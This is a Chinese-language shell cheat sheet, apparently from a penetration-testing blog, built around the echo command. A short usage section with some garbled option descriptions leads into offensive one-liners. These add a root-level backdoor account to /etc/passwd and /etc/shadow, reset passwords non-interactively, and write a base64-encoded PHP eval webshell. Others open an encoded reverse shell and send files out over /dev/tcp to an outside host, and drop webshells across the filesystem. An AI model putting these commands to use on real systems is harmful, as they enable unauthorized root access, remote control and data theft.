```plain
echo 命令可以将后面跟的字符进行输出
echo "Hello LiangZai" #显示字符串
echo "$str, Good morning #显示变量的值
echo -e "Liang \nZai" #反斜杠转义
```

常见选项：

+ -E 默认不支持解释功能
+ -n 不自动换行
+ -e 启用\字符的解释功能
+ \c 不加上换行符号
+ \n 换行且渔村移到行首
+ \r 回国
+ \\ 插入\字符

Copy

```plain
#打开转发
echo "1" > /proc/sys/net/ipv4/ip_forward
 
#添加DNS
echo "nameserver x.x.x.x" > /etc/resolv.conf
 
#添加root用户
echo "ccav3:x:0:0::/home/ccav3:/bin/bash" >> /etc/passwd
#123456000
echo "ccav3:\$6\$RFindqMa\$hSOW1eOSD0FEPCoxUWBMd5KNYEuoz2b0MxuSSUBcv0PA0V1bee62f/1q0TGTnEhJpTghBdBBGNoOo1fRk1BWS/:18736:0:99999:7:::" >> /etc/shadow
 
#修改root密码
echo "ccav:password" |chpasswd
 
#利用echo -e方式解释，无交互修改密码
echo -e '123456000\n123456000\n'|passwd ccav3
 
#执行命令 or 写文件都行
echo aWZjb25maWcK|base64 -d|bash
 
 
#把base64编码的内容,解密写入一个到1.php里面
echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d > 1.php
 
#反弹Shell
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzMzODkgMD4mMQ==}|{base64,-d}|{bash,-i}
 
#传文件
##发送文件
export LFILE=/tmp/1.tar.gz
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/1.1.1.1/4422'
 
##接收文件
nc -v -l -p 4422 > 1.tar.gz
 
#查找文件并在当前目录下写入Shell
find / -name 111bbb.jpg|while read file;do sh -c "echo '111'">$(dirname $file)/111.txt;done
 
find / -name 111bbb.jpg|while read file;do sh -c "echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d">$(dirname $file)/1.php;done
```

